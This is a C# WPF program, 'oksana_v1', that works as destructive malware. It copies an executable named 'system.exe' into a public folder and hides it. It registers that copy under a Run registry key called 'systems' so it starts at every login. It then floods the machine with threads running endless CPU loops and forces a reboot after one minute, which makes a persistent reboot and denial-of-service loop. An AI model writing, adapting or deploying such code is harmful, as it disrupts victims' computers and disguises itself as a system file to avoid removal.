# oksana_v1
using DoFactory.GangOfFour.Singleton.Structural;
using JCS;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;

namespace WpfApplication_OKSANA
{
/// <summary>
/// Логика взаимодействия для MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
public static string needPatch = "C:\\Users\\Public\\";


public MainWindow()
{
if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista" )
{
autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
//SetAutorunValue(false, needPatch + "system.exe"); // убрать из автозагрузки
}
else
if (OSVersionInfo.Name == "Windows XP")
{
needPatch = "C:\\Documents and Settings\\All Users\\";
autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
//SetAutorunValue(false, needPatch + "system.exe"); // убрать из автозагрузки
}

InitializeComponent();
}



private void Window_Loaded(object sender, RoutedEventArgs e)
{
if (!File.Exists(needPatch + "system.exe"))
{
try
{
File.Copy("system.exe", needPatch + "system.exe");
File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);

}
catch { }
}
start();
}

public static void sys_sleep()
{
while (true)
{
Thread s = new Thread(s_b);
s.Start();
}
}
private static void s_b()
{
int y = 2;
while (true)
{
y *= y;
}
}



public static void start()
{
Stopwatch sw = new Stopwatch();
sw.Start();
bool b = true;
bool pl = false;
while (b)
{
if (sw.ElapsedMilliseconds > 20000)
{
if (!pl)
{
Thread g = new Thread(sys_sleep);
g.Start();
pl = true;
}
}
if (sw.ElapsedMilliseconds > 60000)
{
DoExitWin(EWX_REBOOT);
b = false;
}
}
}





[StructLayout(LayoutKind.Sequential, Pack = 1)]
internal struct TokPriv1Luid
{
public int Count;
public long Luid;
public int Attr;
}
[DllImport("kernel32.dll", ExactSpelling = true)]
internal static extern IntPtr GetCurrentProcess();
[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
[DllImport("advapi32.dll", SetLastError = true)]
internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
internal static extern bool ExitWindowsEx(int flg, int rea);
internal const int EWX_REBOOT = 0x00000002;
internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
internal const int TOKEN_QUERY = 0x00000008;
internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

public static Thread thread1;
public static void DoExitWin(int flg)
{
bool ok;
TokPriv1Luid tp;
IntPtr hproc = GetCurrentProcess();
IntPtr htok = IntPtr.Zero;
ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
tp.Count = 1;
tp.Luid = 0;
tp.Attr = SE_PRIVILEGE_ENABLED;
ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
ok = ExitWindowsEx(flg, 0);
}
}

public class autorun: Singleton<autorun>
{
public static bool SetAutorunValue(bool autorun, string npath)
{
const string name = "systems";
string ExePath = npath;
RegistryKey reg;

reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
try
{
if (autorun)
reg.SetValue(name, ExePath);
else
reg.DeleteValue(name);
reg.Flush();
reg.Close();
}
catch
{
return false;
}
return true;
}
}
}
namespace DoFactory.GangOfFour.Singleton.Structural
{
public class Singleton<T> where T : class
{
private static T _instance;

protected Singleton()
{
}

private static T CreateInstance()
{
ConstructorInfo cInfo = typeof(T).GetConstructor(
BindingFlags.Instance | BindingFlags.NonPublic,
null,
new Type[0],
new ParameterModifier[0]);

return (T)cInfo.Invoke(null);
}

public static T Instance
{
get
{
if (_instance == null)
{
_instance = CreateInstance();
}

return _instance;
}
}
}
}
